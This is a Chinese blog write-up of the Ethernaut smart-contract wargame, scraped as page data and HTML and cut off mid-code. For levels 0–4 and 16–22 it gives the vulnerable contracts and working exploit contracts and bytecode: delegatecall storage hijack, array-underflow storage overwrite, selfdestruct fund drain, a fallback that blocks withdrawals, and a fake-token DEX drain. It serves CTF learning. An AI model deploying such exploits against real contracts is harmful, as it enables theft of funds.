public timeZone1Library; // 0 address public timeZone2Library; // 1 address public owner; // 2 fallback() external { owner = 0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F; } } contract Hacker { address target = 0x4464A38441e76713439883883752A60B02C24298; address new_library; constructor() { new_library = address (new ClaimOwnership()); Preservation t = Preservation(target); t.setFirstTime(uint256(uint160(new_library))); t.setFirstTime(0); selfdestruct(payable(0)); } } Insights As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract “libraries” that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.\nlibrary变量存取state是非常危险的，所以library关键字避免了这个行为。\nLevel 17. Recovery A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address.\nThis level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.\nSource pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Recovery { //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg.sender, _initialSupply); } } contract SimpleToken { using SafeMath for uint256; // public variables string public name; mapping (address =\u003e uint) public balances; // constructor constructor(string memory _name, address _creator, uint256 _initialSupply) public { name = _name; balances[_creator] = _initialSupply; } // collect ether in return for tokens fallback() external payable { balances[msg.sender] = msg.value.mul(10); } // allow transfers of tokens function transfer(address _to, uint _amount) public { require(balances[msg.sender] \u003e= _amount); balances[msg.sender] = balances[msg.sender].sub(_amount); balances[_to] = _amount; } // clean up after ourselves function destroy(address payable _to) public { selfdestruct(_to); } } Analysis 没看懂题目是啥意思？也不说清楚啥地址lost了。考的是暴露的selfdestruct？\nEXP // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface SimpleToken { function destroy(address payable _to) external; } contract Hacker { address target = 0xdED8992B6FEF8BEB0326Ef93dc34E5e7Ba2dF78C; address payable hacker = payable (0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F); constructor() { SimpleToken(target).destroy(hacker); selfdestruct(payable(0)); } } Level 18. MagicNumber To solve this level, you only need to provide the Ethernaut with a “Solver”, a contract that responds to “whatIsTheMeaningOfLife()” with the right number.\nThe solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.\nSource pragma solidity ^0.6.0; contract MagicNum { address public solver; constructor() public {} function setSolver(address _solver) public { solver = _solver; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } Analysis 意思是只要返回42就行？\nbytes类型永远会在首部存储长度字段的\nEXP emmm用mstore8是过不了的，必须用mstore\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface MagicNum { function setSolver(address _solver) external; } contract Solver { constructor() { /* 602a push 42 6000 push 0 52 mstore 6020 push 0x20 6000 push 0 f3 return */ bytes memory code = hex'602a60005260206000f3'; assembly { return(add(code,0x20),mload(code)) } } } contract Hacker { address target = 0x8FD22bb410240144B69382a85157630f52537FbB; address solver = address(new Solver()); constructor() { MagicNum(target).setSolver(solver); selfdestruct(payable(solver)); } } Level 19. Alien Codex You’ve uncovered an Alien contract. Claim ownership to complete the level.\nSource pragma solidity ^0.5.0; import '../helpers/Ownable-05.sol'; contract AlienCodex is Ownable { bool public contact; bytes32[] public codex; modifier contacted() { assert(contact); _; } function make_contact() public { contact = true; } function record(bytes32 _content) contacted public { codex.push(_content); } function retract() contacted public { codex.length--; } function revise(uint i, bytes32 _content) contacted public { codex[i] = _content; } } Analysis 看一下反编译的revise和retract发现可以直接用retract整数下溢后用revise任意storage写。\n逆向的结果：在索引数组codex[i] = _content时总会有边界检查，codex.length--会把新旧之间的数组元素全部清零。\nfunction retract() { //检查contacted修饰符 if (!(storage[0x00] / 0x0100 ** 0x14 \u0026 0xff)) { assert(); } var var0 = storage[0x01]; var var1 = 0x02d2; var var2 = 0x01; var var3 = var0 - 0x01; func_06E5(var2, var3); } function func_06E5(var arg0, var arg1) { var temp0 = arg0;//1 var temp1 = storage[temp0]; // s[1] var var0 = temp1;// s[1] : 0 var temp2 = arg1;// -1 storage[temp0] = temp2; // newlen : 0xff..fff if (var0 \u003c= temp2) { //如果 oldlen \u003c= newlen label_070C: return; // 整数下溢，走这条分支 } else { // 可能是pop数组的操作，把减掉之后和原来长度之间的storage全部变成0 memory[0x00:0x20] = arg0; // 1 var temp3 = keccak256(memory[0x00:0x20]); //base addr var temp4 = temp3 + var0; // large addr var0 = 0x070b; var var2 = temp3 + arg1; // small addr var var1 = temp4; // large addr var0 = func_0711(var1, var2); goto label_070C; } } function func_0711(var arg0, var arg1) returns (var r0) { var temp0 = arg0; // large arg0 = 0x0733; var temp1 = arg1; // small arg1 = temp0; // large var var0 = temp1; //small if (arg1 \u003c= var0) { return func_072F(arg1, var0); } label_0720: var temp2 = var0; // small storage[temp2] = 0x00; // 置0 var0 = temp2 + 0x01; if (arg1 \u003e var0) { goto label_0720; } arg0 = func_072F(arg1, var0); // Error: Could not resolve method call return address! } function func_072F(var arg0, var arg1) returns (var r0) { return arg0; } function revise(var arg0, var arg1) { // 4 args var temp0 = arg0; arg0 = msg.data[temp0:temp0 + 0x20]; // i arg1 = msg.data[temp0 + 0x20:temp0 + 0x20 + 0x20]; // content if (!(storage[0x00] / 0x0100 ** 0x14 \u0026 0xff)) { assert(); } var var0 = arg1; var var1 = 0x01; var var2 = arg0; // i if (var2 \u003e= storage[var1]) { assert(); } memory[0x00:0x20] = var1; storage[keccak256(memory[0x00:0x20]) + var2] = var0; } EXP In [16]: w3.keccak(b'\\x01'.rjust(0x20,b'\\x00')) Out[16]: HexBytes('0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6') In [17]: w3.eth.get_storage_at(target,0) Out[17]: HexBytes('0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272') In [18]: 0x10000000000000000000000000000000000000000000000000000000000000000 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 Out[18]: 35707666377435648211887908874984608119992236509074197713628505308453184860938 In [19]: hex(_) Out[19]: '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a' // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface AlienCodex { function make_contact() external; function retract() external; function revise(uint i, bytes32 _content) external; } contract Hacker { AlienCodex target = AlienCodex(0xD722Ca9C6655EBc031Ddb5FCff419d525ef66D13); constructor() { target.make_contact(); target.retract(); bytes32 hacker = bytes32(uint(uint160(0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F))); uint offset = (2**256 - 1) - uint(keccak256(abi.encode(uint(1)))) + 1; target.revise(offset, hacker); selfdestruct(payable(0)); } function test() public pure returns (uint) { return (2**256 - 1) - uint(keccak256(abi.encode(uint(1)))) + 1; } } Insights This level exploits the fact that the EVM doesn’t validate an array’s ABI-encoded length vs its actual payload.\n这个漏洞我好像没用到…?\nLevel 20. Denial This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.\nIf you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds) you will win this level.\nSource pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Denial { using SafeMath for uint256; address public partner; // withdrawal partner - pay the gas, split the withdraw address payable public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =\u003e uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public { partner = _partner; } // withdraw 1% to recipient and 1% to owner function withdraw() public { uint amountToSend = address(this).balance.div(100); // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call.value(amountToSend)(\"\"); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend); } // allow deposit of funds fallback() external payable {} // convenience function function contractBalance() public view returns (uint) { return address(this).balance; } } Analysis Error handling: Assert, Require, Revert and Exceptions\nSolidity uses state-reverting exceptions to handle errors. Such an exception undoes all changes made to the state in the current call (and all its sub-calls) and flags an error to the caller.\nWhen exceptions happen in a sub-call, they “bubble up” (i.e., exceptions are rethrown) automatically unless they are caught in a try/catch statement. Exceptions to this rule are send and the low-level functions call, delegatecall and staticcall: they return false as their first return value in case of an exception instead of “bubbling up”.\n确实，在合约call的时候revert不会终止调用合约的执行。所以这个是重入？\nEXP 注意fallback要的是payable的，第一次没加就过不了。\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Denial { function setWithdrawPartner(address _partner) external; function withdraw() external; } contract Partner { Denial target = Denial(0xdDea82B42FB095D3eb9fc0f792C15Bb0c82B61de); fallback() payable external { target.withdraw(); } } contract Hacker { Denial target = Denial(0xdDea82B42FB095D3eb9fc0f792C15Bb0c82B61de); Partner partner = new Partner(); constructor() { target.setWithdrawPartner(address(partner)); selfdestruct(payable(0)); } } Level 21. Shop Сan you get the item from the shop for less than the price asked?\nSource pragma solidity ^0.6.0; interface Buyer { function price() external view returns (uint); } contract Shop { uint public price = 100; bool public isSold; function buy() public { Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() \u003e= price \u0026\u0026 !isSold) { isSold = true; price = _buyer.price.gas(3000)(); } } } Analysis 没看懂什么意思，看了皮卡丘师傅的wp，发现目标是把price改小。3000gas应该没啥影响？\n好吧，是有影响的…修改一次storage(sstore)需要20000gas; sload costs 800 gas.\n看了皮卡丘师傅的wp和黄皮书后发现call只需要700gas\n有两种revert，我遇到的一直是Warning! Error encountered during contract execution [execution reverted] ，所以应该不是gas不够的原因。\n真是非常奇怪，在私链上调试是可以的啊。。。\nEXP 这一题看了一天还是不会，发现很多细节导致我一直revert。暂时认为是out-of-gas的原因，存疑。\n在jsvm上调试了一下查询isSold的操作是不可控的，包含了一个sload操作，用了1069gas。所以说我自己的代码使用的gas不可以超过2000gas。手写试试。\njsvm hacker: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 jsvm shop : 0xd9145CCE52D386f254917e481eB44e9943F39138\njsvm test\n33735B38Da6a701c568545dCfcB03FcB875f56beddC41860485763a6f2ae3a600052600060006004601c600073d9145CCE52D386f254917e481eB44e9943F391385af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3 rinkeby hacker: 0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F rinkeby shop : 0xa0379c92AE6533b4C3f82606852E6ACc416DCc3A\nfinal\n33739B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F1860485763a6f2ae3a600052600060006004601c600073a0379c92AE6533b4C3f82606852E6ACc416DCc3A5af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Hacker { // address target = 0xa0379c92AE6533b4C3f82606852E6ACc416DCc3A; address target = 0xd9145CCE52D386f254917e481eB44e9943F39138; function price() public returns (uint) { (, bytes memory isSold) = 0xa0379c92AE6533b4C3f82606852E6ACc416DCc3A.call(hex'e852e741'); // require(res == true, \"price(): Fail.\"); return uint8(isSold[0x1f]) == 1 ? 99 : 101; } function attack() public { (bool res, ) = target.call(abi.encodeWithSignature(\"buy()\")); require(res == true, \"attack(): Fail.\"); } function testgas() public { (bool res, ) = target.call{gas:30000}(hex'e852e741'); require(res == true, \"testgas(): Fail.\"); } } contract HackersShellcode { constructor() { bytes memory shellcode = hex'33735B38Da6a701c568545dCfcB03FcB875f56beddC41860485763a6f2ae3a600052600060006004601c600073d9145CCE52D386f254917e481eB44e9943F391385af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3'; assembly { return(add(shellcode,0x20),mload(shellcode)) } } fallback() external { } } contract HackersShellcodeRinkeby { constructor() { bytes memory shellcode = hex'33739B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F1860485763a6f2ae3a600052600060006004601c600073a0379c92AE6533b4C3f82606852E6ACc416DCc3A5af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3'; assembly { return(add(shellcode,0x20),mload(shellcode)) } } fallback() external {} } 其实我一开始遇到的问题就是gas不足的问题，在函数调用中如果gas不足在etherscan上不会显示out-of-gas，反而是函数调用会以失败的结果返回。\nLevel 22. Dex The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.\nYou will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.\nYou will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.\nSource pragma solidity ^0.6.0; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Dex { using SafeMath for uint; address public token1; address public token2; constructor(address _token1, address _token2) public { token1 = _token1; token2 = _token2; } // 两个都是自己指定的token？from token可控 假设amount == 1 function swap(address from, address to, uint amount) public { // 从from这个token中转出amount那么多token，换成to这个token // 首先你得有这么多的token可以转出 require(IERC20(from).balanceOf(msg.sender) \u003e= amount, \"Not enough to swap\"); // 计算价格目标的token数量 uint swap_amount = get_swap_price(from, to, amount); // 转出来到中间dex IERC20(from).transferFrom(msg.sender, address(this), amount); // 从中间dex转到to这个token里去 IERC20(to).approve(address(this), swap_amount); IERC20(to).transferFrom(address(this), msg.sender, swap_amount); } // 向中间dex白白转入amount那么多token function add_liquidity(address token_address, uint amount) public{ IERC20(token_address).transferFrom(msg.sender, address(this), amount); } function get_swap_price(address from, address to, uint amount) public view returns(uint){ return( ( amount * IERC20(to).balanceOf(address(this)) ) / IERC20(from).balanceOf(address(this)) ); } function approve(address spender, uint amount) public { SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount); } function balanceOf(address token, address account) public view returns (uint){ return IERC20(token).balanceOf(account); } } contract SwappableToken is ERC20 { constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) { _mint(msg.sender, initialSupply); } function approve(address owner, address spender, uint amount) public returns(bool){ super._approve(owner, spender, amount); } } Analysis 分了两种token，一开始我有各有10个token，contract各有100个token，目标是把contract的某一个token弄为0.\nIn [24]: target Out[24]: '0x163F36EE7C8CF1436e14461397fD003b64AE469F' In [25]: token1 Out[25]: '0x947e563Bf6E16fb542ab9eEb5Bb5ED051F38C34f' In [26]: token2 Out[26]: '0xce98C3170FCdFbC143879c5C3c14FB168b500500' emmmm是否可以自己写一个新的token进去玩？\n要使contract的某个token为空，就是在swap函数中转出的时候把所有的都转出。\nEXP remix的gas估计，我愿称之为神。\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract MyERC20Token { address hacker = 0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F; address target = 0x163F36EE7C8CF1436e14461397fD003b64AE469F; function balanceOf(address account) public view returns (uint256) { if (account == hacker || account == target) { return 1; } else { return 1; } } function transferFrom(address, address, uint256) public returns (bool) { return true; } } interface Dex { function swap(address, address, uint) external; } contract Hacker { address ME2T = address(new MyERC20Token()); Dex target = Dex(0x163F36EE7C8CF1436e14461397fD003b64AE469F); address token1 = 0x947e563Bf6E16fb542ab9eEb5Bb5ED051F38C34f; address token2 = 0xce98C3170FCdFbC143879c5C3c14FB168b500500; constructor() { target.swap(ME2T,token2,1); // selfdestruct(payable(0)); } } 第一次transferFrom中忘记返回true了，remix估计会fail，就真的fail了。\n通关留念 ",
  "wordCount" : "4590",
  "inLanguage": "en",
  "datePublished": "2021-02-21T10:52:18+08:00",
  "dateModified": "2021-02-21T10:52:18+08:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ainevsia.github.io/post/ethernaut/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Ainevsia Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ainevsia.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ainevsia.github.io/" accesskey="h" title="Ainevsia Blog (Alt + H)">Ainevsia Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      Ethernaut 通关笔记
    </h1>
    <div class="post-meta"><span title='2021-02-21 10:52:18 +0800 CST'>February 21, 2021</span>

</div>
  </header> 
  <div class="post-content"><p>Ethernaut复活了，赶紧开始做题</p>
<h1 id="level-0-hello-ethernaut">Level 0. Hello Ethernaut<a hidden class="anchor" aria-hidden="true" href="#level-0-hello-ethernaut">#</a></h1>
<p>使用的是浏览器里的js对象的方式来进行的，之前还没有尝试过</p>
<h1 id="level-1-fallback">Level 1. Fallback<a hidden class="anchor" aria-hidden="true" href="#level-1-fallback">#</a></h1>
<p>需要知道怎么在console里调用函数的时候附加上交易的value值，以及如何调用fallback函数。不用web3py的操作一开始还真不太会。</p>
<h1 id="level-2-fallout">Level 2. Fallout<a hidden class="anchor" aria-hidden="true" href="#level-2-fallout">#</a></h1>
<p>一款对程序猿友好的字体是多么重要。</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691990291/blog/ethernaut/Snipaste_2021-03-07_18-52-18_uqewnk.png" alt=""  />
</p>
<p>一开始在网页里看我是根本没看出来还有这回事，还加了个迷惑性极强的注释，导致我看了一圈发现没有改owner的操作啊。</p>
<p>复制到编辑器里就稍微明显一点了，不然我是真看不出区别。</p>
<h1 id="level-3-coin-flip">Level 3. Coin Flip<a hidden class="anchor" aria-hidden="true" href="#level-3-coin-flip">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">CoinFlip</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">uint256</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">consecutiveWins</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">lastHash</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">FACTOR</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">consecutiveWins</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">_guess</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint256</span>(<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> (<span style="color:#ae81ff">1</span>)));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">lastHash</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">blockValue</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">revert</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lastHash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">blockValue</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">/</span> (<span style="color:#a6e22e">FACTOR</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">side</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">side</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">_guess</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">consecutiveWins</span><span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">consecutiveWins</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xDD0b2E36064953cD7b75c0a35aF25D82fF948575</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">FACTOR</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CoinFlip</span> <span style="color:#a6e22e">cf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CoinFlip</span>(<span style="color:#a6e22e">target</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint256</span>(<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> (<span style="color:#ae81ff">1</span>)));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">/</span> (<span style="color:#a6e22e">FACTOR</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">side</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cf</span>.<span style="color:#a6e22e">flip</span>(<span style="color:#a6e22e">side</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>还需要顺便复习一下web3py的用法</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691990291/blog/ethernaut/Snipaste_2021-03-07_19-32-10_qpi48u.png" alt=""  />
</p>
<p>最新的<a href="https://web3py.readthedocs.io/en/stable/web3.eth.html?highlight=getstorage">文档</a>已经用<code>get_storage_at</code>这个函数了</p>
<h1 id="level-4-telephone">Level 4. Telephone<a hidden class="anchor" aria-hidden="true" href="#level-4-telephone">#</a></h1>
<p><a href="https://docs.soliditylang.org/en/latest/security-considerations.html?highlight=tx.origin#tx-origin">tx.origin</a>是交易的发送方，不是方法调用的调用方。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Telephone</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_owner</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_owner</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span> () <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">account</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span>  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xDe3CaD19ADcbCC04674FE56B0627C230e7b81f4A</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Telephone</span> <span style="color:#a6e22e">t</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Telephone</span>(<span style="color:#a6e22e">target</span>);
